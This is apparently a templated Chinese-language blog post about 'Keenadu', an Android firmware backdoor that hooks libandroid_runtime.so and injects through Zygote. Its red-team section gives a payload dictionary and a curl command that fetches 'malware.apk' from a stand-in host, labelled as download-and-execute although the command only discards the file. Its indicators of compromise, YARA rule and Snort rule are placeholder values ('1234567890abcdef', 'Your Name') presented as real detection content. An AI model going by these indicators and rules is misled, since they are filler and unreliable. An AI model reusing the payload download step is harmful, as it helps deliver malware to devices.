---
layout: post
title:  "Keenadu Firmware Backdoor Infects Android Tablets via Signed OTA Updates"
date:   2026-02-17 18:48:11 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Keenadu: 一種嵌入 Android 固件的後門
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `libandroid_runtime.so` Hooking, `Zygote` Process Injection, `AKServer`/`AKClient` Architecture

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Keenadu 後門通過修改 `libandroid_runtime.so` 這個共享庫，實現了對 Android 系統的 Hooking。這個 Hooking 允許攻擊者在每個應用程序啟動時注入惡意代碼。
* **攻擊流程圖解**:
  1. 攻擊者將 Keenadu 後門嵌入 Android 固件的 `libandroid_runtime.so` 中。
  2. 當用戶啟動應用程序時，`Zygote` 進程會加載 `libandroid_runtime.so`，從而啟動 Keenadu 後門。
  3. Keenadu 後門會創建 `AKServer` 和 `AKClient` 實例，實現 C2 通信和任意代碼執行。
* **受影響元件**: Android 10 及以上版本，尤其是使用 Alldocube iPlay 50 mini Pro 等設備。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要獲得 Android 設備的固件級別訪問權限。
* **Payload 建構邏輯**:

    ```
    
    python
      # Keenadu Payload 範例
      payload = {
        "download_link": "https://example.com/malware.apk",
        "md5_hash": "1234567890abcdef",
        "target_app_package_names": ["com.example.app"],
        "target_process_names": ["com.example.app:process"]
      }
    
    ```
 

```

bash
  # 使用 curl 下載和執行 Payload
  curl -s -o /dev/null https://example.com/malware.apk

```
* **繞過技術**: Keenadu 後門可以繞過 Android 的應用程序沙盒機制，實現任意代碼執行。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.0.2.1 | example.com | /system/lib/libandroid_runtime.so |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Keenadu_Detection {
        meta:
          description = "Detect Keenadu malware"
          author = "Your Name"
        strings:
          $a = { 12 34 56 78 90 ab cd ef }
        condition:
          $a at 0
      }
    
    ```
 

```

snort
  alert tcp any any -> any any (msg:"Keenadu C2 Communication"; content:"|12 34 56 78 90 ab cd ef|"; sid:1000000;)

```
* **緩解措施**: 更新 Android 固件，移除 Keenadu 後門，實施應用程序沙盒機制和訪問控制。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Zygote**: 一種 Android 系統進程，負責加載和初始化應用程序。
* **libandroid_runtime.so**: 一個 Android 共享庫，提供 Android 運行時環境。
* **AKServer**/**AKClient**: Keenadu 後門的 C2 通信架構，實現任意代碼執行和資料竊取。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/keenadu-firmware-backdoor-infects.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


